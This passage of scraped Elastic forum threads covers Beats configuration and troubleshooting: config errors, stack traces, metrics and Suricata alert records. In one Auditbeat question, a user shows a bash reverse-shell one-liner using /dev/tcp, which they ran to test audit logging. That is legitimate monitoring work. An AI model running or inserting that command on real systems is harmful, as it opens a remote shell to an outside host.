    "body": "Hi, Not sure if this issue was already reported. Found an unusual behaviour with metricbeat. Typically when Xpack is enabled, username and password are added in the metricbeat.yml. When the password contains the literals \"$$\" (consecutive $), elasticsearch fails to authorize the user. To replicate, try having the password of a user with literals like \"P@$$XXyy\"",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "82f03c5d-3e21-405e-8188-17f4870d5373",
    "url": "https://discuss.elastic.co/t/winlogbeat-vs-filebeat/225685",
    "title": "Winlogbeat vs Filebeat",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "ManuelF",
    "date": "March 30, 2020, 1:47pm March 30, 2020, 9:46pm March 31, 2020, 4:27pm",
    "body": "Hi, Filebeat and Winlogbeat seem to work similarly. Both beats seem to be able to process logs from Windows (in the case of Filebeats, it can also process logs from other OS). My questions would be: 1- Which beat is better to process Windows logs? 2- What advantages does one have over the other? 3- For some reason, would it be worth installing both beats to process Windows logs? Thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "be428a53-f74c-44f2-b998-ae93992f2f88",
    "url": "https://discuss.elastic.co/t/error-panic-in-job-unable-to-monitor-my-service/225498",
    "title": "Error \"Panic in job\" - Unable to monitor my service",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "luok0",
    "date": "March 29, 2020, 6:16am March 30, 2020, 2:43am March 30, 2020, 8:38am March 30, 2020, 1:07pm March 30, 2020, 4:13pm March 30, 2020, 6:25pm March 31, 2020, 3:30pm",
    "body": "Got below error in heartbeat's debug log when tried to monitor one service while it works fine for other services: hearbeat.yml: // # Configure monitors heartbeat.monitors: - type: http # List or urls to query urls: [\"https://dncpri1p.cny.net:21375/dataservices/v1/b15/eok/metadata/20200213/OD/grok.deoiO.YjiwG:name=jack,Index=pc,CvType=persen,Frequency=2H/\"] check.request: method: GET check.response: status: 200 # body: '{\"error\" : null*}' # Configure task schedule schedule: '@every 10s' ssl: enabled: true verification_mode: none 2020-03-28T11:09:03.005-0400 ERROR scheduler/scheduler.go:355 Panic in job 'http@https://dncpri1p.cny.net:21375/dataservices/v1/b15/eok/metadata/20200213/OD/grok.deoiO.YjiwG:name=jack,Index=pc,CvType=persen,Frequency=2H/'. Recovering, but please report this: runtime error: invalid memory address or nil pointer dereference. 2020-03-28T11:09:03.008-0400 ERROR scheduler/scheduler.go:357 Stacktrace: goroutine 167 [running]: runtime/debug.Stack(0x10fcf57, 0x3a, 0xc0423368d8) /usr/local/go/src/runtime/debug/stack.go:24 +0xae github.com/elastic/beats/heartbeat/scheduler.(*Scheduler).runTask.func1.1(0xc042136af0, 0xc0424b7e80) /go/src/github.com/elastic/beats/heartbeat/scheduler/scheduler.go:357 +0xfe panic(0xf4ba60, 0x1817bc0) /usr/local/go/src/runtime/panic.go:502 +0x237 github.com/elastic/beats/heartbeat/monitors/active/dialchain.TLSLayer.func1.1(0x119e540, 0xc042450a80, 0x3, 0xc0424b21a8, 0x22, 0x119e540) /go/src/github.com/elastic/beats/heartbeat/monitors/active/dialchain/tls.go:83 +0x462 github.com/elastic/beats/heartbeat/monitors/active/dialchain.afterDial.func1(0x10bfd26, 0x3, 0xc0424b21a8, 0x22, 0x8, 0xc04238a440, 0xc0424d8d70, 0xc0424d8cf8) /go/src/github.com/elastic/beats/heartbeat/monitors/active/dialchain/util.go:89 +0xc1 github.com/elastic/beats/libbeat/outputs/transport.DialerFunc.Dial(0xc04223eae0, 0x10bfd26, 0x3, 0xc0424b21a8, 0x22, 0x410c63, 0xc0420b4500, 0x50, 0x48) /go/src/github.com/elastic/beats/libbeat/outputs/transport/transport.go:40 +0x55 github.com/elastic/beats/heartbeat/monitors/active/http.(*SimpleTransport).RoundTrip(0xc0421e4a50, 0xc0421fce00, 0x0, 0x0, 0x0) /go/src/github.com/elastic/beats/heartbeat/monitors/active/http/simple_transp.go:84 +0x105 net/http.send(0xc0421fcc00, 0x1188e20, 0xc0421e4a50, 0xbf97f807b5b9dbe4, 0xb74201d71, 0x182dde0, 0xc042004138, 0xbf97f807b5b9dbe4, 0xc0424d9068, 0x1) /usr/local/go/src/net/http/client.go:252 +0x18c net/http.(*Client).send(0xc0421e4a80, 0xc0421fcc00, 0xbf97f807b5b9dbe4, 0xb74201d71, 0x182dde0, 0xc042004138, 0x0, 0x1, 0x3) /usr/local/go/src/net/http/client.go:176 +0x101 net/http.(*Client).Do(0xc0421e4a80, 0xc0421fcc00, 0x182dde0, 0xc0421fcc00, 0x57fda2) /usr/local/go/src/net/http/client.go:615 +0x294 github.com/elastic/beats/heartbeat/monitors/active/http.execRequest(0xc0421e4a80, 0xc0421fcc00, 0xc0422914c0, 0xbf97f803b5b9dbe4, 0x7ba737d71, 0x182dde0, 0x0, 0x0, 0x0, 0x0, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/active/http/task.go:252 +0xad github.com/elastic/beats/heartbeat/monitors/active/http.execPing(0xc0421e4a80, 0xc0421fc900, 0x0, 0x0, 0x0, 0x3b9aca000, 0xc0422914c0, 0x0, 0x0, 0x0, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/active/http/task.go:226 +0x143 github.com/elastic/beats/heartbeat/monitors/active/http.createPingFactory.func1(0xc0421e4900, 0x3, 0xc0424d96f0, 0xc0424d9758) /go/src/github.com/elastic/beats/heartbeat/monitors/active/http/task.go:171 +0x449 github.com/elastic/beats/heartbeat/monitors.MakePingIPFactory.func1.1(0x120, 0xc0424d9778, 0x410c63) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:194 +0x38 github.com/elastic/beats/heartbeat/monitors.MakeSimpleCont.func1(0x10, 0xf81240, 0xc0424d97a8, 0x410c63, 0xc04223e8e0, 0x20) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:184 +0x2d github.com/elastic/beats/heartbeat/monitors.funcTask.Run(0xc04213e3b0, 0x18, 0x20, 0x20, 0xc04223e8e0, 0x0, 0xc04205d000) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:440 +0x2e github.com/elastic/beats/heartbeat/monitors.WithFields.func1(0xc0424d9701, 0xc04223e8e0, 0xc0424d97f8, 0x7cf9a8, 0xfb4920, 0xc04223e8e0) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:398 +0x51 github.com/elastic/beats/heartbeat/monitors.funcTask.Run(0xc04223e8e0, 0x118b520, 0xc04213e3b0, 0x118b520, 0xc04223e8e0, 0x182dde0, 0x1e9614) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:440 +0x2e github.com/elastic/beats/heartbeat/monitors.makeByHostAnyIPJob.func1(0x7, 0xc0423de91b, 0x5, 0x2704b70, 0xc04209b9a8, 0x42824e) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:323 +0x940 github.com/elastic/beats/heartbeat/monitors.annotated.func1(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0420682c0, 0xc0421e58c0, 0x10c66cd, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:140 +0xce github.com/elastic/beats/heartbeat/monitors.MakeJob.func1(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0421e58c0, 0xc8, 0xc0421381a8, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:127 +0xef github.com/elastic/beats/heartbeat/monitors.(*funcJob).Run(0xc04240c560, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x582169631, 0x182dde0, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/util.go:438 +0x89 github.com/elastic/beats/heartbeat/monitors.(Job).Run-fm(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc042388420, 0xc04209bf88, 0xc04209bef0, ...) /go/src/github.com/elastic/beats/heartbeat/monitors/task.go:120 +0x8d github.com/elastic/beats/heartbeat/monitors.(*task).prepareSchedulerJob.func1(0xc000000010, 0x110f030, 0xc042136af0) /go/src/github.com/elastic/beats/heartbeat/monitors/task.go:85 +0x84 github.com/elastic/beats/heartbeat/scheduler.(*Scheduler).runTask.func1(0xc042136af0, 0xc0424b7e80, 0xc042136af0, 0xc04240caa0) /go/src/github.com/elastic/beats/heartbeat/scheduler/scheduler.go:362 +0x62 created by github.com/elastic/beats/heartbeat/scheduler.(*Scheduler).runTask /go/src/github.com/elastic/beats/heartbeat/scheduler/scheduler.go:352 +0x63",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "c4566b7c-dbf7-4d2d-8c78-8197d278ecee",
    "url": "https://discuss.elastic.co/t/trouble-sending-logs-to-logstash-from-filebeat-pipeline-error-recieved/225566",
    "title": "Trouble sending logs to Logstash from Filebeat - Pipeline error recieved",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "13ill13urr",
    "date": "March 29, 2020, 4:27pm March 30, 2020, 8:58am March 31, 2020, 3:19pm",
    "body": "Hi there, pretty new to the Elastic Stack and I keep getting an error when trying to set up Filebeats and Logstash to work together. Error: < ''' Failed to execute action {:action=>LogStash::PipelineAction::Create/pipeline_id:main, :exception=>\"LogStash::ConfigurationError\", :message=>\"Expected one of [ \\t\\r\\n], \"# \", \"=>\" at line 13, column 10 (byte 255) after output {\\n\\telasticsearch {\\n\\t\\thosts => \"http://192.168.0.26:9200\"\\n\\t\\tmanage_template => false\\n\\t\\tindex => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\"\\n\\t\\tpipeline => \"%{[@metadata][pipeline]}\"\\n\\t\\tstdout \", :backtrace=>[\"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:47:in compile_imperative'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:55:in compile_graph'\", \"/usr/share/logstash/logstash-core/lib/logstash/compiler.rb:17:in block in compile_sources'\", \"org/logstash/execution/AbstractPipelineExt.java:161:in initialize'\", \"org/logstash/execution/JavaBasePipelineExt.java:47:in initialize'\", \"/usr/share/logstash/logstash-core/lib/logstash/pipeline_action/create.rb:36:in execute'\", \"/usr/share/logstash/logstash-core/lib/logstash/agent.rb:326:in `block in converge_state'\"]} ''' /> I cannot make heads no tails as to what this error is trying to tell me or what I have done wrong. My logstash.conf file looks like so: < ''' input { beats { port => 5044 } } output { elasticsearch { hosts => \"http://192.168.0.26:9200\" manage_template => false index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" pipeline => \"%{[@metadata][pipeline]}\" stdout { codec => rubydebug } } } ''' /> Any and all help would be greatly appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "77517782-0a81-4a74-8d5c-bc2ae0c05b94",
    "url": "https://discuss.elastic.co/t/problem-file-beat/225889",
    "title": "Problem file beat",
    "category": [
      "Beats"
    ],
    "author": "Youssef_SBAI",
    "date": "March 31, 2020, 2:38pm",
    "body": "I have this problem when i run the logstsh [monitoring] log/log.go:145 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":130,\"time\":{\"ms\":6}},\"total\":{\"ticks\":860,\"time\": {\"ms\":6},\"value\":860},\"user\":{\"ticks\":730}},\"handles\":{\"limit\": {\"hard\":1048576,\"soft\":1048576},\"open\":7},\"info\":{\"ephemeral_id\":\"1c52c2e8-83c7-4a99-ab47- 288d1706564a\",\"uptime\":{\"ms\":240052}},\"memstats\": {\"gc_next\":9095424,\"memory_alloc\":5185400,\"memory_total\":83939992},\"runtime\": {\"goroutines\":26}},\"filebeat\":{\"harvester\":{\"open_files\":1,\"running\":1}},\"libbeat\":{\"config\": {\"module\":{\"running\":0}},\"pipeline\":{\"clients\":1,\"events\":{\"active\":0}}},\"registrar\":{\"states\": {\"current\":1}},\"system\":{\"load\":{\"1\":0.59,\"15\":0.61,\"5\":0.62,\"norm\": {\"1\":0.1475,\"15\":0.1525,\"5\":0.155}}}}}}",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "01e4b8d7-1692-43cb-a7e5-568a5044f994",
    "url": "https://discuss.elastic.co/t/use-user-name-keyword-field-in-a-kibana-visualisation/225638",
    "title": "Use user.name.keyword field in a kibana visualisation",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "eoli3n",
    "date": "March 30, 2020, 9:18am March 30, 2020, 9:39am March 30, 2020, 11:05am March 31, 2020, 8:08am March 31, 2020, 8:43am",
    "body": "Hi, I want to be able to unique.count on user.name field from filebeat-* indexes with system auth module enabled. When i do this, i get a kibana error \"* of * shards failed\", and when i go to \"response\" tab, i can read \"Fielddata is disabled on text fields by default. Set fielddata=true on [user.name] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory. Alternatively use a keyword field instead.\" So i want to be able to query user.name.keyword instead of just user.name but i can't find it in field selector. When i query my mappings i found that keyword exists GET filebeat-*/_mapping/field/user.name gives { \"filebeat-2020.03.21\" : { \"mappings\" : { \"user.name\" : { \"full_name\" : \"user.name\", \"mapping\" : { \"name\" : { \"type\" : \"text\", \"fields\" : { \"keyword\" : { \"type\" : \"keyword\", \"ignore_above\" : 256 } } } } } } }, So why can't i query that user.name.keyword in kibana visualisation ?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ee4a44f1-05b0-4293-81c4-abfbf122e6cd",
    "url": "https://discuss.elastic.co/t/how-to-set-close-removed-and-close-timeout-globally-for-all-file-inputs/225817",
    "title": "How to set close_removed and close_timeout globally for all file inputs?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "asp",
    "date": "March 31, 2020, 8:37am",
    "body": "Hi, I found this old thread here: Setting close_timeout for all inputs in filebeat Filebeat Hey, is there a way to set close_timeout for all filebeat inputs in one place (or change the default)? I have a lot of inputs and setting it for every single one is just redundant. I'm on version 6.6 and tried different combinations but nothing has worked for me. thanks, Marek Are there any news? Is it possible to configure these parameters globally now? If not, I opened this feature request. github.com/elastic/beats filebeat: log input: make parameters globally configurable too. (local overrides global) opened 08:34AM - 31 Mar 20 UTC 0asp0 Describe the enhancement: At least close_timeout and close_removed parameters should be able to be set globally. The parameters should be overridden by local... If it is already possible, I will close this request or you may mark it as duplicate. I did not find any open github issue about this issue. Thanks, Andreas",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "163f9a0e-d4c0-4108-bdfa-1c6df33e06bc",
    "url": "https://discuss.elastic.co/t/filebeat-is-putting-whole-json-object-into-one-field/225815",
    "title": "Filebeat is putting whole JSON object into one field",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mattness",
    "date": "March 31, 2020, 8:16am March 31, 2020, 8:26am",
    "body": "Hello, I am using filebeat to route log data from my machine to Elasticsearch. The log-files contain multiple lines with every line being one JSON object literal. I want each line to become an event with as many fields as there are properties. But so far this only works partly. Every JSON object literal becomes an event in the index but then the whole line is just put into one field called \"message\". Is this a mapping problem or configuration problem? Can anyone help? Thanks in advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c4410400-bc53-411b-b44c-1e6fbadcfdc8",
    "url": "https://discuss.elastic.co/t/deleting-files-after-file-beat-processes-them/225796",
    "title": "Deleting files after file beat processes them",
    "category": [
      "Beats"
    ],
    "author": "Youssef_SBAI",
    "date": "March 31, 2020, 6:27am",
    "body": "Hi, I would like to know if there is a way of deleting log files once filebeat has finished processing. We have files sent to an input folder, file beat then processes them. I would like to clear them down once it is done (as we no longer need the files anymore). Reading through posts, filebeat doesn't provide anything out of box (would be a nice enhancement ). How does everyone deal with this? Is it just a case of dumping the files to the input directory and then wait 24hours before removing?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6d52f086-f687-4bd7-ba34-86f4aefcfafa",
    "url": "https://discuss.elastic.co/t/functionbeat-incorrect-iam-service-principal-for-lambda-in-aws-china-regions/225775",
    "title": "FunctionBeat: incorrect IAM Service Principal for Lambda in AWS China regions",
    "category": [
      "Beats"
    ],
    "author": "henrysher",
    "date": "March 31, 2020, 5:05am",
    "body": "Hello, I have tested FunctionBeat in AWS China region with those errors: 2020-03-31T12:13:10.748+0800 INFO [aws] aws/op_cloudformation.go:97 Stack event received, ResourceType: AWS::IAM::Role, LogicalResourceId: fnbcloudwatchIAMRoleLambdaExecution, ResourceStatus: CREATE_IN_PROGRESS 2020-03-31T12:13:10.748+0800 INFO [aws] aws/op_cloudformation.go:97 Stack event received, ResourceType: AWS::Logs::LogGroup, LogicalResourceId: fnbcloudwatchLogGroup, ResourceStatus: CREATE_IN_PROGRESS 2020-03-31T12:13:10.748+0800 INFO [aws] aws/op_cloudformation.go:97 Stack event received, ResourceType: AWS::IAM::Role, LogicalResourceId: fnbcloudwatchIAMRoleLambdaExecution, ResourceStatus: CREATE_FAILED, ResourceStatusReason: Invalid principal in policy: \"SERVICE\":\"lambda.amazonaws.com.cn\" (Service: AmazonIdentityManagement; Status Code: 400; Error Code: MalformedPolicyDocument; Request ID: 33c06f52-b16e-4a33-9b95-36ecb81361ab) 2020-03-31T12:13:10.748+0800 INFO [aws] aws/op_cloudformation.go:97 Stack event received, ResourceType: AWS::Logs::LogGroup, LogicalResourceId: fnbcloudwatchLogGroup, ResourceStatus: CREATE_IN_PROGRESS, ResourceStatusReason: Resource creation Initiated 2020-03-31T12:13:10.748+0800 INFO [aws] aws/op_cloudformation.go:97 Stack event received, ResourceType: AWS::Logs::LogGroup, LogicalResourceId: fnbcloudwatchLogGroup, ResourceStatus: CREATE_FAILED, ResourceStatusReason: Resource creation cancelled And I also verified the exported cfn template and found the root cause: incorrect IAM service principal for lambda in AWS China regions. According to the code from line 257 to 261 in https://github.com/elastic/beats/blob/master/x-pack/functionbeat/manager/aws/template_builder.go, it has used the cfn pre-defined parameter \"AWS::URLSuffix\", for AWS global regions: amazonaws.com, for AWS China regions: amazonaws.com.cn. However, \"lambda.amazonaws.com.cn\" is not the correct IAM service principal for Lambda in AWS China regions but it is \"lambda.amazonaws.com\". And you can further refer to my latest validation in https://github.com/henrysher/aws-china-iam-service-principal-list. Thanks! Henry",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ee7b97a5-320c-4a8b-9b73-d5000ecfb1fc",
    "url": "https://discuss.elastic.co/t/filebeat-with-suricata-cannot-resolve-timestamp-from-null/225518",
    "title": "Filebeat with suricata cannot resolve timestamp from null",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "mloebl",
    "date": "March 28, 2020, 11:30pm March 30, 2020, 8:38am March 30, 2020, 1:19pm March 31, 2020, 11:50am",
    "body": "Currently using a pfSense running 2.4.x and a filebeat I built against 7.6.1 for FreeBSD. Whenever an alert comes in, I get: error.message:cannot resolve [timestamp] from null as part of path [suricata.eve.timestamp] Here's my suricata.yml: - module: suricata # All logs eve: enabled: true # Set custom paths for the log files. If left empty, # Filebeat will choose the paths depending on your OS. var.paths: - \"/var/log/suricata/*/eve.json*\" I had built filebeat against x-pack as wasn't sure if the oss version included it, and I think it may be working as when filebeat starts up I see without any errors: 2020-03-28T17:30:46.955-0400 INFO beater/filebeat.go:92 Enabled modules/filesets: suricata (eve) as well as this if debug is enabled: 020-03-28T17:30:56.982-0400 DEBUG [input] log/config.go:204 recursive glob enabled 2020-03-28T17:30:56.982-0400 DEBUG [input] log/input.go:164 exclude_files: [(?-s:.)gz(?-m:$)]. Number of stats: 2 2020-03-28T17:30:56.982-0400 DEBUG [input] file/states.go:68 New state added for /var/log/suricata/suricata_igb051967/eve.json 2020-03-28T17:30:56.982-0400 DEBUG [publisher] pipeline/client.go:220 Pipeline client receives callback 'onFilteredOut' for event: {Timestamp:0001-01-01 00:00:00 +0000 UTC Meta:null Fields:null Private:{Id:882918-115 Finished:true Fileinfo:<nil> Source:/var/log/suricata/suricata_igb051967/eve.json Offset:2120297 Timestamp:2020-03-28 17:30:31.624443077 -0400 EDT TTL:-1ns Type:log Meta:map[] FileStateOS:882918-115} TimeSeries:false} 2020-03-28T17:30:56.982-0400 DEBUG [acker] beater/acker.go:64 stateful ack {\"count\": 1} 2020-03-28T17:30:56.983-0400 DEBUG [input] log/input.go:185 input with previous states loaded: 1 2020-03-28T17:30:56.983-0400 INFO log/input.go:152 Configured paths: [/var/log/suricata/*/eve.json*] 2020-03-28T17:30:56.983-0400 DEBUG [registrar] registrar/registrar.go:356 Processing 1 events 2020-03-28T17:30:56.983-0400 DEBUG [reload] cfgfile/list.go:101 Starting runner: suricata (eve) 2020-03-28T17:30:56.983-0400 DEBUG [registrar] registrar/registrar.go:326 Registrar state updates processed. Count: 1 2020-03-28T17:30:56.983-0400 DEBUG [registrar] registrar/registrar.go:346 Registrar states cleaned up. Before: 2, After: 2, Pending: 0 2020-03-28T17:30:56.983-0400 DEBUG [registrar] registrar/registrar.go:411 Write registry file: /usr/local/sbin/data/registry/filebeat/data.json (2) Here's an example: @timestamp Mar 28, 2020 @ 19:05:29.997 _id BMNkI3EBzBkAR07yrjJR _index filebeat-7.6.1-2020.03.10-000001 _score - _type _doc agent.ephemeral_id bb1df2a5-2109-4c30-b8ee-0281e734dad5 agent.hostname firewall agent.id bb1444d3-d287-4023-827e-940c25f8ca63 agent.type filebeat agent.version 7.6.1 destination.address REMOVED destination.ip REMOVED destination.port 23 ecs.version 1.4.0 error.message cannot resolve [timestamp] from null as part of path [suricata.eve.timestamp] event.created Mar 28, 2020 @ 19:05:31.998 event.dataset suricata.eve event.module suricata event.original {\"timestamp\":\"2020-03-28T19:05:29.997845-0400\",\"flow_id\":1743764644772309,\"in_iface\":\"igb0\",\"event_type\":\"alert\",\"src_ip\":\"31.163.149.200\",\"src_port\":63604,\"dest_ip\":\"REMOVED\",\"dest_port\":23,\"proto\":\"TCP\",\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2403313,\"rev\":56306,\"signature\":\"ET CINS Active Threat Intelligence Poor Reputation IP group 14\",\"category\":\"Misc Attack\",\"severity\":2,\"metadata\":{\"updated_at\":[\"2020_03_27\"],\"created_at\":[\"2013_10_08\"],\"signature_severity\":[\"Major\"],\"tag\":[\"CINS\"],\"deployment\":[\"Perimeter\"],\"attack_target\":[\"Any\"],\"affected_product\":[\"Any\"]}},\"flow\":{\"pkts_toserver\":1,\"pkts_toclient\":0,\"bytes_toserver\":64,\"bytes_toclient\":0,\"start\":\"2020-03-28T19:05:29.997845-0400\"},\"payload\":\"\",\"payload_printable\":\"\",\"stream\":0,\"packet\":\"ANC3mo+JKKJLe35hCABFAAAoRI0AADYGn8ofo5XIRKCmbfh0ABdEoKZtAAAAAFAC42xIYwAAAAAAAAAAAAAAAA==\",\"packet_info\":{\"linktype\":1}} fileset.name eve host.name firewall input.type log log.file.path /var/log/suricata/suricata_igb051967/eve.json log.offset 2,299,115 network.community_id 1:qeEmQjf3RrvU1PhMHxxAAqrPbbs= network.transport TCP service.type suricata source.address 31.163.149.200 source.ip 31.163.149.200 source.port 63604 suricata.eve - suricata.eve.timestamp Mar 28, 2020 @ 19:05:29.997 tags suricata Thank you! New to Elastic so still learning.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a60ae8bd-0cb3-4728-b4d0-ced6c0517c65",
    "url": "https://discuss.elastic.co/t/filebeat-vs-winlogbeat/225684",
    "title": "Filebeat vs Winlogbeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "ManuelF",
    "date": "March 30, 2020, 1:46pm March 30, 2020, 9:44pm March 30, 2020, 9:44pm",
    "body": "Hi there, Filebeat and Winlogbeat seem to work similarly. Both beats seem to be able to process logs from Windows (in the case of Filebeats, it can also process logs from other OS). My questions would be: 1- Which beat is better to process Windows logs? 2- What advantages does one have over the other? 3- For some reason, would it be worth installing both beats to process Windows logs? Thank you",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d112787d-02a9-4452-96f8-bdcb59d3c219",
    "url": "https://discuss.elastic.co/t/insert-elastic-search/225647",
    "title": "Insert elastic search",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Youssef_SBAI",
    "date": "March 30, 2020, 9:47am March 30, 2020, 9:37pm",
    "body": "I need the file to be inserted in elastic search to be removed from the directory",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "960f69d7-ccd5-4f29-bc09-5d515c2000da",
    "url": "https://discuss.elastic.co/t/how-to-interpret-the-auditd-data-a-fields/225725",
    "title": "How to interpret the auditd.data.a fields",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "kasra",
    "date": "March 30, 2020, 6:04pm April 20, 2020, 5:42pm",
    "body": "I am trying to decode the arguments of syscalls which I have in \"execve\" logs. As these a0 to a3 fields are supposed to be encoded in hexadecimal I've tried to decode them to find out the args of the process but couldn't catch anything in auditd \"ausearch\" utility would do the task or using \"xxd -r -p\" for the raw log of it, but here in auditbeat I can't find the way to decode the args here is the example I have: I ran this command on my host bash -i &> /dev/tcp/myvps/6666 0>&1 But I only have these fields parsed in kibana process.args: bash, -i process.title: bash -i and the event.original of it is: type=SYSCALL msg=audit(1585588280.744:216616): arch=c000003e syscall=59 success=yes exit=0 a0=55ec60a91300 a1=55ec60b2e0a0 a2=55ec609c6a50 a3=7f7337c74cc0 items=2 ppid=1353 pid=1969 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=2746 comm=\"bash\" exe=\"/bin/bash\" key=\"exec\", type=EXECVE msg=audit(1585588280.744:216616): argc=2 a0=\"bash\" a1=\"-i\", type=CWD msg=audit(1585588280.744:216616): cwd=\"/home/kasra\", type=PATH msg=audit(1585588280.744:216616): item=0 name=\"/bin/bash\" inode=219 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0, type=PATH msg=audit(1585588280.744:216616): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2075 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0, type=PROCTITLE msg=audit(1585588280.744:216616): proctitle=62617368002D69 there isn't any detail about rest args: &> /dev/tcp/myvps/6666 0>&1 I would appreciate any help in this case auditbeat version: 7.5",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e4b76db8-75d0-4f7e-a5ef-e65da0ab981d",
    "url": "https://discuss.elastic.co/t/how-to-add-system-hostfs-definition-into-the-yml-files/225047",
    "title": "How to add system.hostfs definition into the yml files",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "micas",
    "date": "March 25, 2020, 7:50pm March 30, 2020, 4:59pm",
    "body": "According to https://www.elastic.co/guide/en/beats/metricbeat/current/running-on-docker.html i need to pass on docker containers the \"-e -system.hostfs=/hostfs\" however is there any way that i can add that to either the system.yml i have on the modules.d folder or to the metricbeat.yml? for my use case it would be ideal. What would be the correct key to add to those yml if so? i have tried on metricbeat.yml: system.hostfs: /hostfs on system.yml (on modules.d folder): - module: system hostfs: /host Yet none of them seem to work",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f118acfc-1184-4684-9a3c-0689f0c39c66",
    "url": "https://discuss.elastic.co/t/questions-on-system-diskio-latency-metrics/225459",
    "title": "Questions on system.diskio latency metrics",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "jkarras",
    "date": "March 27, 2020, 7:26pm March 30, 2020, 4:54pm",
    "body": "Hello, I am trying to get a better understanding of the disk io metrics below. Included are the definitions for each per the Elastic documentation online. system.diskio.read.time - total number of milliseconds spent by all reads system.diskio.write.time - total number of milliseconds spent by all writes system.diskio.iostat.await - average time spent for requests issued to the device to be served system.diskio.iostat.service_time - average service time (in milliseconds) for I/O requests that were issued to the device Q1: Is system.diskio.io.time equal to the average of system.diskio.read.time and system.diskio.write.time for a given time interval on a given device? Q2: How does system.diskio.io.time relate to system.diskio.iostat.await? Q3: Which metric is best to use to represent overall disk latencies - both reads and writes? Thank you.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6aac9a91-f4ed-4112-af9d-de29d308d782",
    "url": "https://discuss.elastic.co/t/kibana-elasticsearch-error/225694",
    "title": "Kibana Elasticsearch error",
    "category": [
      "Beats"
    ],
    "author": "thywoe",
    "date": "March 30, 2020, 2:20pm",
    "body": "Error: Request to Elasticsearch failed: {\"error\":{\"root_cause\":[{\"type\":\"illegal_argument_exception\",\"reason\":\"The length of [message.keyword] field of [4Ne_K3EB1QJ6ixoFhFAq] doc of [filebeat-7.6.1] index has exceeded [1000000] - maximum allowed to be analyzed for highlighting. This maximum can be set by changing the [index.highlight.max_analyzed_offset] index level setting. For large texts, indexing with offsets or term vectors is recommended!\"}],\"type\":\"search_phase_execution_exception\",\"reason\":\"all shards failed\",\"phase\":\"query\",\"grouped\":true,\"failed_shards\":[{\"shard\":0,\"index\":\"filebeat-7.6.1\",\"node\":\"hIx9LXyeQEe17651p2N-vw\",\"reason\":{\"type\":\"illegal_argument_exception\",\"reason\":\"The length of [message.keyword] field of [4Ne_K3EB1QJ6ixoFhFAq] doc of [filebeat-7.6.1] index has exceeded [1000000] - maximum allowed to be analyzed for highlighting. This maximum can be set by changing the [index.highlight.max_analyzed_offset] index level setting. For large texts, indexing with offsets or term vectors is recommended!\"}}],\"caused_by\": Please Help!!!!!!!!!!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3c1569d1-a07b-4ad1-b034-ef99eca8bace",
    "url": "https://discuss.elastic.co/t/recommendations-for-syslog-ingestion/223557",
    "title": "Recommendations for syslog ingestion?",
    "category": [
      "Beats"
    ],
    "author": "_finack",
    "date": "March 30, 2020, 1:46pm March 16, 2020, 3:43pm March 24, 2020, 5:31pm March 30, 2020, 1:46pm",
